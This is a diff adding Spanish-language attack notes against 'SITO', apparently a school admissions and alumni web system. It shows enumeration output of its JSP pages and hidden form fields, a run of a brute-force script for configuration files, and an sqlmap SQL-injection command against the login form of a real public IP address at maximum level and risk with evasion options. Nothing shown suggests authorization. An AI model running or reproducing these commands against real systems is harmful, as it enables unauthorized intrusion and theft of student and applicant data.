@@ -1,0 +1,30 @@
+Script de Explotación Agresiva para SITO:
+
+ /jsp/cerrar_sesion.jsp - hidden_inputs: [('yAccion', '')]
+📍 Accesible: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N (129286 bytes)
+🔍 /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N - emails: ['usuario@dominio.com']
+🔍 /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N - sql_queries: ['select', 'select', 'select']
+🔍 /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N - hidden_inputs: [('yAccion', ''), ('yInteresado', '0'), ('yEncuestado', '0')]
+📍 Accesible: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D (128122 bytes)
+🔍 /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D - emails: ['usuario@dominio.com']
+🔍 /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D - sql_queries: ['select', 'select', 'select']
+🔍 /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D - hidden_inputs: [('yAccion', ''), ('yInteresado', '0'), ('yEncuestado', '0')]
+📍 Accesible: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z (38640 bytes)
+🔍 /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z - hidden_inputs: [('yAccion', ''), ('yInteresado', '0'), ('yEncuestado', '0')]
+📍 Accesible: /jsp/escolar/proceso_admision_lic/proceso_interesado.jsp (115279 bytes)
+🔍 /jsp/escolar/proceso_admision_lic/proceso_interesado.jsp - sql_queries: ['select', 'select', 'select']
+🔍 /jsp/escolar/proceso_admision_lic/proceso_interesado.jsp - hidden_inputs: [('yAccion', ''), ('yInteresado', '0'), ('yEncuestado', '0')]
+📍 Accesible: /jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1 (27430 bytes)
+🔍 /jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1 - hidden_inputs: [('yColonia', '-1'), ('yCiudad', '-1'), ('yEstado', '-1')]
+
+Script Adicional para Fuerza Bruta de Archivos de Configuración:
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito]
+└──╼ $/bin/python3 /home/marcos_os/Desktop/ProyectoSito/FBAConfig.py
+[+] Buscando archivos de configuración...
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito]
+└──╼ $
+
+sqlmap -u "http://189.254.143.102/jsp/index.jsp" --data="yAccion=login&yUsuario=test&xUsuario=test&xContrasena=test&yIntentos=1" --level=5 --risk=3 --tamper=space2comment --random-agent
+
+En proceso...
